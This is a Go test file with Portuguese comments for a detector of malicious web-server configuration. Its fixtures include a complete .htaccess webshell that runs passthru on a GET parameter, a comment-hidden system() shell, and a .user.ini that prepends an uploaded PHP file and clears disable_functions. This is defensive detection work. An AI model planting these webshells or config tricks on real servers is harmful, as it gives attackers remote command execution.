package facts

import (
	"strings"
	"testing"
)

// O htshell: o webshell inteiro dentro do .htaccess. Duas linhas, nenhum .php
// no docroot, e as duas passavam por baixo da ferramenta — o coletor de
// gatilhos só olhava /etc/php*, e a varredura de código seleciona por extensão.
func TestHtaccessWebshellCompleto(t *testing.T) {
	const conteudo = `# Self contained .htaccess web shell
<Files ~ "^\.ht">
Order allow,deny
Allow from all
</Files>

AddType application/x-httpd-php .htaccess

###### SHELL ###### <?php echo "\n";passthru($_GET['c']." 2>&1"); ?>###### LLEHS ######
`
	cw := analisarConfigWeb("/var/www/.htaccess", "htaccess", conteudo)
	if cw == nil {
		t.Fatal("o htshell inteiro saiu como nil")
	}
	motivos := map[string]string{}
	for _, ln := range cw.Linhas {
		motivos[ln.Motivo] = ln.Text
	}
	for _, quer := range []string{"handler", "codigo", "expoe"} {
		if _, ok := motivos[quer]; !ok {
			t.Errorf("faltou %q — motivos vistos: %v", quer, motivos)
		}
	}
}

// A TAG DE PHP MORA DEPOIS DO `#`, e é o ponto: o `#` faz o Apache ignorar a
// linha, e o interpretador não sabe nada de `#`. Pular comentário antes de
// procurar a tag apagaria a única forma que se usa.
func TestTagDePHPDentroDeComentarioNaoEhPulada(t *testing.T) {
	cw := analisarConfigWeb("/srv/.htaccess", "htaccess",
		"# <?php system($_GET['cmd']); ?>\n")
	if cw == nil || len(cw.Linhas) != 1 || cw.Linhas[0].Motivo != "codigo" {
		t.Fatalf("a tag depois do # precisa ser vista: %+v", cw)
	}
}

// Mapear `.php` para o PHP é o uso NORMAL da diretiva, e é o que hospedagem
// compartilhada escreve para escolher a versão do interpretador. Ele é
// coletado (o check é quem decide), mas o alvo precisa sair certo.
func TestHandlerDeExtensaoPHPEhColetadoComAlvo(t *testing.T) {
	cw := analisarConfigWeb("/var/www/app/.htaccess", "htaccess",
		"AddHandler application/x-httpd-php74 .php .phtml\n")
	if cw == nil || len(cw.Linhas) != 1 {
		t.Fatalf("linhas = %+v", cw)
	}
	if cw.Linhas[0].Motivo != "handler" || cw.Linhas[0].Alvo != ".php .phtml" {
		t.Errorf("alvo = %q, motivo = %q", cw.Linhas[0].Alvo, cw.Linhas[0].Motivo)
	}
}

// `AddType text/plain .log` não faz executar nada, e configuração de conteúdo
// não pode virar achado: é o que há em toda aplicação do mundo.
func TestConfigDeConteudoNaoEhColetada(t *testing.T) {
	const comum = `RewriteEngine On
RewriteCond %{REQUEST_FILENAME} !-f
RewriteRule ^(.*)$ index.php [QSA,L]
AddType text/plain .log
ExpiresByType image/jpeg "access plus 1 month"
`
	if cw := analisarConfigWeb("/var/www/.htaccess", "htaccess", comum); cw != nil {
		t.Fatalf("o .htaccess comum de aplicação não pode virar fato: %+v", cw.Linhas)
	}
}

// O .user.ini é a MESMA diretiva do php.ini, num arquivo que quem faz upload
// consegue escrever — e é INI, não Apache.
func TestUserIniPrependEAfrouxamento(t *testing.T) {
	const conteudo = `; comentário
auto_prepend_file = /var/www/uploads/.i.php
disable_functions =
memory_limit = 256M
`
	cw := analisarConfigWeb("/var/www/uploads/.user.ini", "user.ini", conteudo)
	if cw == nil {
		t.Fatal("nil")
	}
	if len(cw.Linhas) != 2 {
		t.Fatalf("linhas = %+v", cw.Linhas)
	}
	if cw.Linhas[0].Motivo != "prepend" || cw.Linhas[0].Alvo != "/var/www/uploads/.i.php" {
		t.Errorf("prepend = %+v", cw.Linhas[0])
	}
	if cw.Linhas[1].Motivo != "afrouxa" {
		t.Errorf("disable_functions vazio é afrouxamento: %+v", cw.Linhas[1])
	}
}

// O nome é o filtro inteiro da seleção: uma comparação por dirent.
func TestConfigWebPorNome(t *testing.T) {
	for nome, quer := range map[string]string{
		".htaccess": "htaccess", ".user.ini": "user.ini",
		"index.php": "", ".htpasswd": "", "user.ini": "",
	} {
		if got := configWebPorNome(nome); got != quer {
			t.Errorf("configWebPorNome(%q) = %q, quer %q", nome, got, quer)
		}
	}
}

// Uma linha minificada de quilobytes não pode despejar no relatório.
func TestRecorteLimitaOTrecho(t *testing.T) {
	longa := "AddType application/x-httpd-php " + strings.Repeat(".x", 500)
	cw := analisarConfigWeb("/var/www/.htaccess", "htaccess", longa+"\n")
	if cw == nil {
		t.Fatal("nil")
	}
	if len(cw.Linhas[0].Text) > maxTrecho+4 {
		t.Errorf("trecho com %d bytes", len(cw.Linhas[0].Text))
	}
}

// A EXPOSIÇÃO dos `.ht*` é lida como PAR, com escopo de bloco. A configuração
// RECOMENDADA — negar os .ht num bloco e liberar o diretório em outro — é o
// contrário do achado, e sem o escopo ela saía acusada.
func TestExposicaoDeHtRespeitaOEscopoDoBloco(t *testing.T) {
	const recomendada = `<Files ~ "^\.ht">
Require all denied
</Files>
Require all granted
AddType application/x-httpd-php .php
`
	if cw := analisarConfigWeb("/var/www/.htaccess", "htaccess", recomendada); cw != nil {
		for _, ln := range cw.Linhas {
			if ln.Motivo == "expoe" {
				t.Fatalf("negar os .ht e liberar o diretório é a configuração "+
					"RECOMENDADA: %+v", ln)
			}
		}
	}

	const invertida = `<Files ~ "^\.ht">
Require all granted
</Files>
`
	cw := analisarConfigWeb("/var/www/.htaccess", "htaccess", invertida)
	if cw == nil || len(cw.Linhas) != 1 || cw.Linhas[0].Motivo != "expoe" {
		t.Fatalf("liberar os .ht DENTRO do bloco deles é a reversão: %+v", cw)
	}
}

// `Action` NÃO é lista de extensões: a gramática é `Action <tipo-mime>
// <url-do-script-cgi>`. Lê-la como extensão transformava a linha mais banal de
// hospedagem compartilhada com PHP-CGI num CRÍTICO.
func TestActionNaoEhLidaComoExtensao(t *testing.T) {
	const comum = `Action application/x-httpd-php5 /cgi-bin/php5-cgi
AddHandler application/x-httpd-php5 .php
`
	cw := analisarConfigWeb("/var/www/.htaccess", "htaccess", comum)
	if cw == nil {
		t.Fatal("o AddHandler ainda precisa ser coletado")
	}
	for _, ln := range cw.Linhas {
		if strings.Contains(strings.ToLower(ln.Text), "action ") {
			t.Fatalf("a diretiva Action não pode virar fato de handler: %+v", ln)
		}
	}
	if len(cw.Linhas) != 1 || cw.Linhas[0].Alvo != ".php" {
		t.Fatalf("linhas = %+v", cw.Linhas)
	}
}

// O SINAL de cada Option decide, e ler por substring dizia o CONTRÁRIO do
// arquivo numa linha de endurecimento.
func TestOptionsRespeitaOSinal(t *testing.T) {
	casos := map[string]bool{
		"Options +ExecCGI":                    true,
		"Options ExecCGI Indexes":             true,
		"Options +Includes":                   true,
		"Options -ExecCGI -Includes -Indexes": false,
		"Options -ExecCGI":                    false,
		"Options +IncludesNOEXEC":             false,
		"Options -Indexes +FollowSymLinks":    false,
	}
	for linha, quer := range casos {
		cw := analisarConfigWeb("/var/www/.htaccess", "htaccess", linha+"\n")
		got := cw != nil && len(cw.Linhas) == 1 && cw.Linhas[0].Motivo == "cgi"
		if got != quer {
			t.Errorf("%q → cgi=%v, quer %v", linha, got, quer)
		}
	}
}
